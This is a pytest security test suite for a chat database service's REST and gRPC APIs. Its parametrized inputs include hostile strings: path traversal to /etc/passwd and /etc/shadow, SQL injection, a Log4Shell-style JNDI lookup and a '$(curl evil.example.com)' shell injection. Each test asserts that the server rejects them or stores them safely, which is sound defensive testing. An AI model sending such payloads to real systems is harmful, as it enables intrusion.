"""
test_e2e_security.py — Comprehensive end-to-end security and hacking-technique tests.

Covers:
  • Path traversal (entity key, database name, schema ID)
  • Payload manipulation / injection (SQL injection syntax, JNDI, shell injection,
    JSON prototype pollution, oversized bodies)
  • HTTP verb/method tampering
  • Auth header manipulation (Bearer prefix tricks, whitespace, Unicode)
  • Information disclosure (admin endpoints, error messages)
  • Concurrent auth-stress / token exhaustion
  • LRU cache smart-caching behaviour (data stays in memory, LRU eviction)
"""

import json
import os
import threading

import grpc
import pytest
import requests


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _url(settings, path):
    return settings["rest_url"].rstrip("/") + path


def _auth(token):
    return {"Authorization": f"Bearer {token}"}


# ---------------------------------------------------------------------------
# Path-traversal tests (entity key & database name via REST)
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("db,key", [
    ("chatdb", "foo/../../../etc/passwd"),
    ("chatdb", "../../etc/shadow"),
    ("chatdb", "foo/../../templates/evil"),
    ("../evil", "Chat_id"),
    ("chatdb", "..%2F..%2Fetc%2Fpasswd"),   # percent-encoded variant
    ("chatdb", ".\\.\\windows\\system32"),   # Windows-style
])
def test_rest_path_traversal_entity_rejected(settings, db, key):
    """PUT/GET with path-traversal entity keys or database names must be rejected."""
    url_put = _url(settings, f"/entity/{db}")
    resp = requests.put(
        url_put,
        headers=_auth(settings["token"]),
        json={key: {"chat": [{"type": "user", "text": "pwn"}]}},
        timeout=3,
    )
    # The server must reject the request (400 bad request) or return
    # 401/403 (auth gating).  It must NOT return 200 with traversal data.
    assert resp.status_code in {400, 401, 403, 404, 422}, (
        f"Expected rejection for db={db!r} key={key!r}, got {resp.status_code}: {resp.text[:200]}"
    )


@pytest.mark.parametrize("key", [
    "foo/../../../etc/passwd",
    "../../etc/shadow",
    "foo/../../templates/evil",
])
def test_grpc_path_traversal_entity_key_rejected(proc_grpc_stub, key):
    """gRPC PUT/GET with path-traversal entity keys must be rejected."""
    pb2, stub = proc_grpc_stub
    with pytest.raises(grpc.RpcError) as exc:
        stub.Process(pb2.ProcessRequest(
            database_name="chatdb",
            entity_key=key,
            operation="PUT",
            payload=json.dumps({"chat": [{"type": "user", "text": "pwn"}]}).encode(),
            token="",
        ))
    assert exc.value.code() in {
        grpc.StatusCode.INVALID_ARGUMENT,
        grpc.StatusCode.PERMISSION_DENIED,
        grpc.StatusCode.UNAUTHENTICATED,
    }, f"Unexpected code {exc.value.code()} for key={key!r}"


@pytest.mark.parametrize("db", [
    "chatdb/../../../etc",
    "../../etc",
    "chatdb/../../templates",
])
def test_grpc_path_traversal_database_name_rejected(proc_grpc_stub, db):
    """gRPC PUT/GET with path-traversal database names must be rejected."""
    pb2, stub = proc_grpc_stub
    with pytest.raises(grpc.RpcError) as exc:
        stub.Process(pb2.ProcessRequest(
            database_name=db,
            entity_key="Chat_id",
            operation="PUT",
            payload=json.dumps({"chat": [{"type": "user", "text": "pwn"}]}).encode(),
            token="",
        ))
    assert exc.value.code() in {
        grpc.StatusCode.INVALID_ARGUMENT,
        grpc.StatusCode.PERMISSION_DENIED,
        grpc.StatusCode.UNAUTHENTICATED,
    }, f"Unexpected code {exc.value.code()} for db={db!r}"


# ---------------------------------------------------------------------------
# Schema ID path traversal
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("schema_id", [
    "../files/evil",
    "../../etc/passwd",
    "foo/../../../etc/passwd",
    "schema%2F..%2Fevil",
])
def test_schema_path_traversal_put_rejected(settings, schema_id):
    """PUT /schema/{id} with path-traversal schema IDs must be rejected."""
    url = _url(settings, f"/schema/{schema_id}")
    resp = requests.put(
        url,
        headers=_auth(settings["token"]),
        json={"type": "object"},
        timeout=3,
    )
    assert resp.status_code in {400, 401, 403, 404, 503}, (
        f"Expected rejection for schema_id={schema_id!r}, got {resp.status_code}"
    )


@pytest.mark.parametrize("schema_id", [
    "../files/evil",
    "../../etc/passwd",
])
def test_schema_path_traversal_get_rejected(settings, schema_id):
    """GET /schema/{id} with path-traversal schema IDs must be rejected."""
    url = _url(settings, f"/schema/{schema_id}")
    resp = requests.get(url, timeout=3)
    assert resp.status_code in {400, 404, 503}, (
        f"Expected rejection for schema_id={schema_id!r}, got {resp.status_code}"
    )


# ---------------------------------------------------------------------------
# Payload manipulation / injection
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("payload_key", [
    "' OR '1'='1",          # SQL injection
    "1; DROP TABLE users",   # SQL injection (statement terminator)
    "${jndi:ldap://evil.example.com/x}",  # Log4Shell style
    "$(curl evil.example.com)",          # Shell injection
    "`id`",                              # Backtick injection
    "<script>alert(1)</script>",         # XSS attempt
    "\x00null\x00byte",                  # Null-byte injection
    "a" * 10_000,                        # Oversized key
])
def test_injection_payloads_with_valid_token(settings, payload_key):
    """Injection payloads in entity keys/values must not cause errors or
    expose internal state — the server should return 4xx or store safely."""
    url_put = _url(settings, "/entity/chatdb")
    # Use a short, safe key and put the attack vector in the value text only.
    resp = requests.put(
        url_put,
        headers=_auth(settings["token"]),
        json={"safe-key": {"chat": [{"type": "user", "text": payload_key}]}},
        timeout=3,
    )
    # Either the server accepts the payload (200) or rejects it (4xx) — no
    # 500 errors or information leaks are acceptable.
    assert resp.status_code in {200, 400, 413, 422}, (
        f"Server returned {resp.status_code} for payload_key={payload_key[:50]!r}"
    )
    if resp.status_code == 200:
        # Verify the response body contains only the expected {"status":"ok"} and
        # does not echo back or expose the attack payload in any internal form.
        body = resp.text
        assert "goroutine" not in body, "Stack trace leaked in successful PUT response"
        assert "panic" not in body, "Panic info in response body"


def test_oversized_body_rejected(settings):
    """A PUT request with a body exceeding 1 MiB must be rejected with 400/413."""
    url = _url(settings, "/entity/chatdb")
    big_text = "x" * (2 * 1024 * 1024)  # 2 MiB
    resp = requests.put(
        url,
        headers=_auth(settings["token"]),
        # Send raw bytes to bypass any client-side JSON encoding size limit.
        data=json.dumps({"Oversized": {"chat": [{"type": "user", "text": big_text}]}}),
        timeout=5,
    )
    assert resp.status_code in {400, 413}, (
        f"Expected 400 or 413 for oversized body, got {resp.status_code}"
    )


def test_json_depth_bomb_rejected(settings):
    """Deeply nested JSON must not cause a stack overflow or 500 error."""
    url = _url(settings, "/entity/chatdb")
    # Build a 1000-level deep nested object.
    deep = {}
    node = deep
    for _ in range(1000):
        node["x"] = {}
        node = node["x"]
    resp = requests.put(
        url,
        headers=_auth(settings["token"]),
        json={"DeepNested": deep},
        timeout=5,
    )
    # Should return 4xx (bad request / too nested) or 200 if stored fine.
    # Must NOT return 500.
    assert resp.status_code != 500, (
        f"Server returned 500 on deeply nested JSON: {resp.text[:200]}"
    )


def test_empty_database_name_rejected(settings):
    """PUT to /entity/ (empty database name) must be rejected."""
    resp = requests.put(
        _url(settings, "/entity/"),
        headers=_auth(settings["token"]),
        json={"key": {"chat": []}},
        timeout=2,
    )
    assert resp.status_code in {400, 404, 405}, (
        f"Expected 4xx for empty db name, got {resp.status_code}"
    )


# ---------------------------------------------------------------------------
# HTTP method / verb tampering
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("method", ["DELETE", "PATCH", "OPTIONS", "TRACE"])
def test_disallowed_http_methods_on_entity(settings, method):
    """Unsupported HTTP methods on /entity/ must be rejected with 405."""
    url = _url(settings, "/entity/chatdb")
    resp = requests.request(method, url, headers=_auth(settings["token"]), timeout=2)
    assert resp.status_code in {400, 405}, (
        f"Expected 405 for {method}, got {resp.status_code}"
    )


@pytest.mark.parametrize("method", ["POST", "DELETE", "PATCH"])
def test_disallowed_http_methods_on_health(settings, method):
    """Non-GET methods on /health must be rejected."""
    url = _url(settings, "/health")
    resp = requests.request(method, url, timeout=2)
    assert resp.status_code in {400, 405}, (
        f"Expected 405 for {method} /health, got {resp.status_code}"
    )


# ---------------------------------------------------------------------------
# Auth header manipulation
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("header_value", [
    "",                              # Completely absent (handled by missing header test)
    "bearer " + "x" * 50,           # Lowercase 'bearer' prefix
    "BEARER " + "x" * 50,           # Uppercase 'BEARER' prefix
    "Basic dXNlcjpwYXNz",           # Basic auth (not Bearer)
    "Token abc123",                  # Different scheme
    "Bearer",                        # 'Bearer' with no token
    "Bearer " * 3 + "abc",          # Repeated Bearer prefix
    "Bearer \x00token",              # Null byte in token
])
def test_auth_header_manipulation(settings, header_value):
    """Malformed/unexpected Authorization headers must result in 401/403."""
    url = _url(settings, "/entity/chatdb?key=Chat_id")
    try:
        resp = requests.get(url, headers={"Authorization": header_value}, timeout=2)
        assert resp.status_code in {400, 401, 403}, (
            f"Expected auth rejection for header={header_value!r}, got {resp.status_code}"
        )
    except requests.exceptions.InvalidHeader:
        # Some headers are rejected by the HTTP client library itself — acceptable.
        pass


def test_no_authorization_header_rejected(settings):
    """Requests with no Authorization header at all must be rejected."""
    url = _url(settings, "/entity/chatdb?key=Chat_id")
    resp = requests.get(url, timeout=2)
    assert resp.status_code in {401, 403}


# ---------------------------------------------------------------------------
# Information disclosure checks
# ---------------------------------------------------------------------------

def test_error_responses_dont_leak_stack_traces(settings):
    """Error responses must not contain Go stack traces or internal paths."""
    url = _url(settings, "/entity/chatdb")
    resp = requests.put(
        url,
        headers=_auth(settings["token"]),
        data="{malformed json",
        timeout=2,
    )
    assert resp.status_code == 400
    body = resp.text
    assert "goroutine" not in body, "Stack trace leaked in error response"
    assert "/home/" not in body, "File path leaked in error response"
    assert "panic" not in body, "Panic info leaked in error response"


def test_health_endpoint_no_sensitive_info(settings):
    """The /health endpoint must not expose key material or internal details."""
    url = _url(settings, "/health")
    resp = requests.get(url, timeout=2)
    assert resp.status_code == 200
    body = resp.text
    assert "key" not in body.lower() or "status" in body.lower()
    assert "private" not in body.lower()
    assert "secret" not in body.lower()
    # Must return valid JSON with status=ok
    data = resp.json()
    assert data.get("status") == "ok"


def test_admin_workers_requires_auth(settings):
    """GET /admin/workers without auth must return 401/403 (no info disclosure)."""
    url = _url(settings, "/admin/workers")
    resp = requests.get(url, timeout=2)
    assert resp.status_code in {401, 403}, (
        f"Expected auth required on /admin/workers, got {resp.status_code}"
    )


def test_nonexistent_endpoint_404(settings):
    """Accessing a non-existent path must return 404, not 500 or expose details."""
    url = _url(settings, "/this/does/not/exist")
    resp = requests.get(url, timeout=2)
    assert resp.status_code in {404, 405}
    assert "goroutine" not in resp.text


# ---------------------------------------------------------------------------
# Concurrent auth stress test
# ---------------------------------------------------------------------------

def test_concurrent_invalid_auth_attempts(settings):
    """Hammering the API with invalid tokens concurrently must not cause 500s."""
    url = _url(settings, "/entity/chatdb?key=Chat_id")
    results = []

    def attacker(i):
        resp = requests.get(url, headers=_auth(f"fake-token-{i}"), timeout=3)
        results.append(resp.status_code)

    threads = [threading.Thread(target=attacker, args=(i,)) for i in range(50)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert all(s in {400, 401, 403} for s in results), (
        f"Some responses were unexpected: {set(results)}"
    )


def test_concurrent_valid_requests_no_data_race(settings):
    """Concurrent valid GET requests must all return 200 without any 500 errors."""
    url_put = _url(settings, "/entity/chatdb")
    requests.put(
        url_put,
        headers=_auth(settings["token"]),
        json={"RaceCheck": {"chat": [{"type": "assistant", "text": "stable"}]}},
        timeout=3,
    )

    url_get = _url(settings, "/entity/chatdb?key=RaceCheck")
    errors = []

    def reader():
        resp = requests.get(url_get, headers=_auth(settings["token"]), timeout=3)
        if resp.status_code not in {200}:
            errors.append(resp.status_code)

    threads = [threading.Thread(target=reader) for _ in range(30)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert not errors, f"Unexpected status codes during concurrent reads: {errors}"


# ---------------------------------------------------------------------------
# LRU smart-caching behaviour
# ---------------------------------------------------------------------------

def test_data_stays_in_cache_after_write(settings):
    """After a PUT, the data must be immediately available via GET (cached)."""
    key = "CacheImmediateTest"
    url_put = _url(settings, "/entity/chatdb")
    url_get = _url(settings, f"/entity/chatdb?key={key}")

    put_resp = requests.put(
        url_put,
        headers=_auth(settings["token"]),
        json={key: {"chat": [{"type": "assistant", "text": "instant"}]}},
        timeout=3,
    )
    assert put_resp.status_code == 200

    get_resp = requests.get(url_get, headers=_auth(settings["token"]), timeout=3)
    assert get_resp.status_code == 200
    assert get_resp.json()["chat"][0]["text"] == "instant"


def test_repeated_gets_always_return_same_data(settings):
    """All repeated GET requests must return the same value (no stale/corrupt
    entries injected by concurrent writes)."""
    key = "StableKey"
    url_put = _url(settings, "/entity/chatdb")
    url_get = _url(settings, f"/entity/chatdb?key={key}")
    expected = {"chat": [{"type": "assistant", "text": "stable-value"}]}

    requests.put(
        url_put,
        headers=_auth(settings["token"]),
        json={key: expected},
        timeout=3,
    )

    for _ in range(20):
        resp = requests.get(url_get, headers=_auth(settings["token"]), timeout=3)
        assert resp.status_code == 200
        assert resp.json() == expected, f"Inconsistent value: {resp.json()}"


def test_lru_eviction_keeps_recent_entry(settings):
    """After writing N entries, the most recently written entry must still be
    available (LRU evicts oldest, not newest)."""
    # Write a distinct 'recent' key last so it is the most recently used.
    recent_key = "LRU-recent-entry"
    url_put = _url(settings, "/entity/chatdb")

    for i in range(30):
        requests.put(
            url_put,
            headers=_auth(settings["token"]),
            json={f"LRU-bulk-{i}": {"chat": [{"type": "user", "text": f"v{i}"}]}},
            timeout=3,
        )

    requests.put(
        url_put,
        headers=_auth(settings["token"]),
        json={recent_key: {"chat": [{"type": "assistant", "text": "recent"}]}},
        timeout=3,
    )

    resp = requests.get(
        _url(settings, f"/entity/chatdb?key={recent_key}"),
        headers=_auth(settings["token"]),
        timeout=3,
    )
    assert resp.status_code == 200
    assert resp.json()["chat"][0]["text"] == "recent"


# ---------------------------------------------------------------------------
# Encrypted-file security checks (proc-worker path)
# ---------------------------------------------------------------------------

def test_no_plaintext_in_encrypted_blob(proc_grpc_stub, shared_fs):
    """The on-disk .json.enc blob must not contain the plaintext JSON."""
    pb2, stub = proc_grpc_stub
    secret_text = "super-secret-value-XYZ"
    payload = json.dumps({"chat": [{"type": "user", "text": secret_text}]}).encode()
    resp = stub.Process(pb2.ProcessRequest(
        database_name="chatdb",
        entity_key="PlaintextCheck",
        operation="PUT",
        payload=payload,
        token="",
    ))
    assert resp.status == "OK"

    blob_path = shared_fs["files"] / "chatdb_PlaintextCheck.json.enc"
    assert blob_path.exists(), "Encrypted blob was not written"
    blob = blob_path.read_bytes()
    assert secret_text.encode() not in blob, (
        "Plaintext leaked into the on-disk encrypted blob!"
    )


def test_different_writes_produce_different_nonces(proc_grpc_stub, shared_fs):
    """Each write must produce a different nonce (IV) to prevent nonce reuse."""
    pb2, stub = proc_grpc_stub
    nonces = set()
    for i in range(10):
        payload = json.dumps({"chat": [{"type": "user", "text": f"msg-{i}"}]}).encode()
        stub.Process(pb2.ProcessRequest(
            database_name="chatdb",
            entity_key="NonceTest",
            operation="PUT",
            payload=payload,
            token="",
        ))
        meta_path = shared_fs["files"] / "chatdb_NonceTest.meta.json"
        meta = json.loads(meta_path.read_text(encoding="utf-8"))
        nonces.add(meta["iv"])

    assert len(nonces) == 10, (
        f"Nonce reuse detected! Only {len(nonces)} unique nonces across 10 writes."
    )
